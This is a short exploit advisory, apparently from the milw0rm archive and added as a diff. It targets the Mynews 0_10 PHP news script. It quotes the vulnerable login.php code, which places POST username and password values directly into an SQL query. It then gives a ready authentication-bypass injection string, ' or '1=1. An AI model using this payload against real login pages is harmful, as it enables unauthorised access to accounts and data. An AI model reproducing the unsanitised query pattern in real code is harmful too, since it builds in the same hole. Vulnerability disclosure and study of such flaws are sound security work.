@@ -1,0 +1,42 @@
+#########################################################################################
+[0x01] Informations:
+
+Name           : Mynews 0_10
+Download       :
+http://prdownloads.sourceforge.net/mynews/mynews_beta_0_10.zip?download
+Vulnerability  : Auth Bypass
+Author         : x0r
+Contact        : andry2000@hotmail.it
+Notes          : Proud to be Italian
+#########################################################################################
+[0x02] Bug:
+
+Bugged file is /[path]/login.php
+
+[Code]
+if ( $request == "POST" )
+{
+	$username = $_POST['username'];
+	$passwd = $_POST['passwd'];
+	
+	// Call mysql class
+	$db = new db;
+	$db->info['sql_host']		=	$conf['sql_host'];
+	$db->info['sql_user']		=	$conf['sql_user'];
+	$db->info['sql_pass']		=	$conf['sql_pass'];
+	$db->info['sql_db']		=	$conf['sql_db'];
+	$db->connect();
+	$sql = "SELECT * FROM users WHERE username='$username' &&
+password='$passwd' ";
+	$check_query = $db->query($sql);
+	$row = mysql_numrows($check_query);
+[/code]
+
+#########################################################################################
+[0x03] Exploit:
+
+Exploit: ' or '1=1
+
+########################################################################################
+
+# milw0rm.com [2009-02-10]
